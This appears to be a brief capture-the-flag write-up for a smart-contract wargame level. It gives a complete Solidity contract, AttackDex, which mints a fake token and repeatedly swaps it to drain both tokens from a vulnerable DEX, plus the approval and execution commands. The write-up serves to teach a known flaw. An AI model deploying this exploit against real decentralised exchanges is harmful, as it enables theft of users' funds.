Similar aproach as in Dex, but this time we creates our token to drain both token1 and token2. Similar strategy but contract is needed.
After deploying instance we need to deploy following contract:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

interface Dex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address, address, uint) external;
    function approve(address, uint) external;
}

contract AttackDex is ERC20 {
    Dex dex;
    address token1;
    address token2;

    constructor(Dex _dex) ERC20("AtackToken", "AT") {
        dex = _dex;
        token1 = dex.token1();
        token2 = dex.token2();
    }

    // needs to add approve for this contract
    //await contract.approve('THIS_ADDRESS', 10)
    
    function attack() public {
        dex.approve(address(dex), 2**50);
        this.approve(address(dex), 2**50);
        _mint(address(this), 10);
        _mint(address(dex), 100);
        attackToken(token1);
        this.transfer(address(dex), 10); // that will set up initial values to ensure calculation are good. this contract will have 10, DEX: 100
        attackToken(token2);
    }

    function attackToken(address tokenAddress) private {
        address thisContract = address(this);
        IERC20(tokenAddress).transferFrom(msg.sender, thisContract, 10);

        dex.swap(tokenAddress, thisContract, 10);
        dex.swap(thisContract ,tokenAddress, 20);
        dex.swap(tokenAddress, thisContract, 24);
        dex.swap(thisContract ,tokenAddress, 30);
        dex.swap(tokenAddress, thisContract, 41);
        dex.swap(thisContract ,tokenAddress, 45);
    }
}
```
Later we need to add approve to DexHack to spend token1 and token2 supply on our behalf. 
```
await contract.approve('DEX_HACK', '10000000000000000000')
```
And execute attack() on DexHack contract
